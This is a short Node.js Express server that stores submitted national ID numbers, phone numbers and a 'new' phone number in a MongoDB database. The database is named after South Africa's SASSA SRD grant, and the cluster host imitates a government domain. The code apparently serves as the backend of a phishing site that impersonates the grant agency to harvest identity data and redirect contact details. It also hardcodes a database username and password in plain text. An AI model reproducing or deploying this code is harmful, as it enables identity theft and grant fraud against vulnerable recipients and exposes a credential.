const express = require('express');
const cors = require('cors');
const { MongoClient } = require('mongodb');

const app = express();
app.use(cors());
app.use(express.json());

const uri = 'mongodb+srv://mkasigiven09:yGiI6nmIj33vDrhk@srd-sassa-gov-za.qnutzho.mongodb.net/sassa?retryWrites=true&w=majority&appName=srd-sassa-gov-za';

// Modern MongoClient without deprecated options
const client = new MongoClient(uri, {
  serverApi: { version: '1' } // Optional but recommended for Atlas
});

let collection; // Will be assigned after DB connects

// Route to handle submissions
app.post('/submit', async (req, res) => {
  if (!collection) {
    return res.status(503).send('Database not ready');
  }

  const { idNumber, phoneNumber, newphoneNumber } = req.body;

  try {
    const exists = await collection.findOne({ idNumber, phoneNumber });
    if (exists) return res.status(409).send('Duplicate application');

    await collection.insertOne({
      idNumber,
      phoneNumber,
      newphoneNumber,
      timestamp: new Date(),
    });

    res.status(200).send('Application submitted');
  } catch (err) {
    console.error('Insert error:', err);
    res.status(500).send('Server error');
  }
});

// Start Express server first (so Render sees the open port)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  connectToDB(); // Connect to MongoDB after server starts
});

// Connect to MongoDB
async function connectToDB() {
  try {
    await client.connect();
    const db = client.db('sassa');
    collection = db.collection('srd');
    console.log('Connected to MongoDB');
  } catch (err) {
    console.error('Failed to connect to DB:', err.message);
  }
}
